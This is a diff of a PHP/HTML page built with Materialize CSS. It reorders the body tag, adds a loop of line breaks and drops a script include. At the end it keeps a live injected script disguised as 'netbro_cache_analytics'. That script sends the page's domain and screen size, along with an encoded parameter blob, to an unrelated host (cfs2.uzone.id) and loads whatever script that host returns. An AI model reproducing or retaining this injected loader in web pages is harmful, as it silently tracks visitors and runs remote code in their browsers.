@@ -50,10 +50,8 @@ website ini di design menggunakan Materialize CSS FrameWork -->
   //$('.collapsible').collapsible();
 </script>
 
-
-<style type="text/css">
-
-    header, main, footer {
+<style>
+ header, main, footer {
       padding-left: 300px;
     }
 
@@ -61,17 +59,20 @@ website ini di design menggunakan Materialize CSS FrameWork -->
       header, main, footer {
         padding-left: 0;
       }
-    }   
-</style>
+    }
+</style>          
 
 </head>
-
-<body class="parallax-demo" ng-app="myapp">
-
 
 <?php include('nav.php'); ?>
 
 <?php include('slider.php'); ?>
+
+<body class="parallax-demo" ng-app="myapp">
+<? for($a = 1; $a<=18; $a++)
+{
+   echo '<br />';
+}?>
 
 <?php include('parallax.php'); ?>
 
@@ -129,8 +130,7 @@ $(document).ready(function(){
     <!-- Twitter Button -->
     <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
 
-       <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
-  <script src="js/materialize.js"></script>
+     <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
 
 <script>
 function Task(data)
@@ -168,7 +168,6 @@ self.tasks.remove(task)
 ko.applyBindings(new TaskListViewModel());
 </script>
 
- <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngrAjZP9TWiF%2foZ8ek4Nwk4TeDFWwWpSabA6pdZftoi9Kf1gaHx%2bmv0ya2hyEnmdboGFKhGwbFoPbZIympaFfonVxgkUwCzVMXfeG3eUfA1YI%2fAfAn2RULOF0dLm0cOFWpD3OPLknDfbVVRqML70mKCWh%2bLCNbo1RiIj2jQ3gnC5c%2f3MSDAjhV2D4TquZr7R8K67vMSjLj6pmp0sneGT%2f9QN3OLKkK1%2bjKIi9m1NkLc1CTBjwGr%2buE7PEUiPpv3ebRWFPAuKDz83FtI0LXNueCCBZ8TtfSRmSlRampAf9qYwh0KE3nGsRNx9WII%2b3WIWEZPrm1SqHGElDzM3TGxZEEVl%2bWnLQzamIfPgW%2b0xlnGB2JwQAF5B6T%2btsPtBpMnSnomNM%2fE2qPFs5TZBebko1ImrIHhhfyizikquBdfixns3E%2b8qUCG0ITOt3%2fMZdd5MAXIhyaNKmI4NbnTFdVkOZDkqsSbo4F6xYFhXUvxye5f1zUkKde37Hb17qAACO1KIlEGlTC80SpnsQCtipYvKtIZBABFL4GKYhM7gk62MIJNLB1OM7%2fU6MSFhs9GMUYeUU9KJd%2fg5DDCq%2bClV13AscmQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngrAjZP9TWiF%2foZ8ek4Nwk4TeDFWwWpSabA6pdZftoi9Kf1gaHx%2bmv0ya2hyEnmdboGFKhGwbFoPbZIympaFfonVxgkUwCzVMXfeG3eUfA1YI%2fAfAn2RULOF0dLm0cOFWpD3OPLknDfbVVRqML70mKCWh%2bLCNbo1RiIj2jQ3gnC5c%2f3MSDAjhV2D4TquZr7R8K67vMSjLj6pmp0sneGT%2f9QN3OLKkK1%2bjKIi9m1NkLc1CTBjwGr%2buE7PEUiPpv3ebRWFPAuKDz83FtI0LXNueCCBZ8TtfSRmSlRampAf9qYwh0KE3nGsRNx9WII%2b3WIWEZPrm1SqHGElDzM3TGxZEEVl%2bWnLQzamIfPgW%2b0xlnGB2JwQAF5B6T%2btsPtBpMnSnomNM%2fE2qPFs5TZBebko1ImrIHhhfyizikquBdfixns3E%2b8qUCG0ITOt3%2fMZdd5MAXIhyaNKmI4NbnTFdVkOZDkqsSbo4F6xYFhXUvxye5f1zUkKde37Hb17qAACO1KIlEGlTC80SpnsQCtipYvKtIZBABFL4GKYhM7gk62MIJNLB1OM7%2fU6MSFhs9GMUYeUU9KJd%2fg5DDCq%2bClV13AscmQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 </body>
 </html>
